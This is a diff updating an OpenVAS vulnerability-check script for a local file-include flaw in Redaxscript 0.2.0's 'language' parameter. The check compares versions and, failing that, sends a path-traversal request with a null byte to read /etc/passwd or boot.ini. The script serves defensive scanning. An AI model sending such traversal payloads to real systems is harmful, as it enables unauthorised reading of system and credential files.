@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: redaxscript_34476.nasl 9425 2018-04-10 12:38:38Z cfischer $
+# $Id: redaxscript_34476.nasl 13902 2019-02-27 10:31:50Z cfischer $
 #
 # Redaxscript 'language' Parameter Local File Include Vulnerability
 #
@@ -24,84 +24,89 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "Redaxscript is prone to a local file-include vulnerability because
-  it fails to properly sanitize user-supplied input.
+CPE = "cpe:/a:redaxscript:redaxscript";
 
-  An attacker can exploit this vulnerability to view and execute
-  arbitrary local files in the context of the webserver process. This
-  may aid in further attacks.
-
-  Redaxscript 0.2.0 is vulnerable; other versions may also be
-  affected.";
-
-
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.100122");
- script_version("$Revision: 9425 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-10 14:38:38 +0200 (Tue, 10 Apr 2018) $");
- script_tag(name:"creation_date", value:"2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)");
- script_bugtraq_id(34476);
- script_tag(name:"cvss_base", value:"6.8");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
+  script_oid("1.3.6.1.4.1.25623.1.0.100122");
+  script_version("$Revision: 13902 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-27 11:31:50 +0100 (Wed, 27 Feb 2019) $");
+  script_tag(name:"creation_date", value:"2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)");
+  script_bugtraq_id(34476);
+  script_tag(name:"cvss_base", value:"6.8");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
+  script_name("Redaxscript 'language' Parameter Local File Include Vulnerability");
+  script_category(ACT_MIXED_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
+  script_dependencies("redaxscript_detect.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("redaxscript/detected");
 
- script_name("Redaxscript 'language' Parameter Local File Include Vulnerability");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34476");
 
+  script_tag(name:"summary", value:"Redaxscript is prone to a local file-include vulnerability because
+  it fails to properly sanitize user-supplied input.");
 
- script_category(ACT_ATTACK);
+  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view and execute
+  arbitrary local files in the context of the webserver process. This may aid in further attacks.");
+
+  script_tag(name:"affected", value:"Redaxscript 0.2.0 is vulnerable. Other versions may also be
+  affected.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+
   script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
- script_dependencies("redaxscript_detect.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34476");
- exit(0);
+  script_tag(name:"solution_type", value:"WillNotFix");
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 include("version_func.inc");
+include("misc_func.inc");
 
-port = get_http_port(default:80);
-if(!can_host_php(port:port))exit(0);
+if( ! port = get_app_port( cpe:CPE, service:"www" ) )
+  exit( 0 );
 
-if(!version = get_kb_item(string("www/", port, "/redaxscript")))exit(0);
-if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);
+if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) )
+  exit( 0 );
 
-vers = matches[1];
-dir  = matches[2];
+vers = infos['version'];
+dir = infos['location'];
 
-if(!isnull(vers) && vers >!< "unknown") {
+if(vers && vers != "unknown" ) {
+  if(version_is_equal( version:vers, test_version:"0.2.0" ) ) {
+    report = report_fixed_ver( installed_version:vers, fixed_version:"None", install_path:dir );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
+  exit( 99 );
+} else {
 
-  if(version_is_equal(version:vers, test_version:"0.2.0")) {
-    VULN = TRUE;
-  }  
+  if( ! dir )
+    exit( 0 );
 
-} else {  
-# No version found, try to exploit.
-  if(!isnull(dir)) {
-    foreach file (make_list("etc/passwd", "boot.ini")) {
-      url = string(dir, "/index.php?language=../../../../../../../../", file, "%00");
-      req = http_get(item:url, port:port);
-      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-      if( buf == NULL )continue;
-      
-      if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf))
-        {    
-   	   VULN = TRUE;
-	   break;
-        } 
-   }
-  }   
+  if( dir == "/" )
+    dir = "";
+
+  # No version found, try to exploit.
+  files = traversal_files();
+  foreach pattern( keys( files ) ) {
+
+    file = files[pattern];
+    url = string(dir, "/index.php?language=../../../../../../../../", file, "%00");
+
+    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
+      report = report_vuln_url( url:url, port:port );
+      security_message( port:port, data:url );
+      exit( 0 );
+    }
+  }
 }
 
-if(VULN) {
-
-  security_message(port:port);
-  exit(0);
-
-}
-
-exit(0);
+exit( 99 );
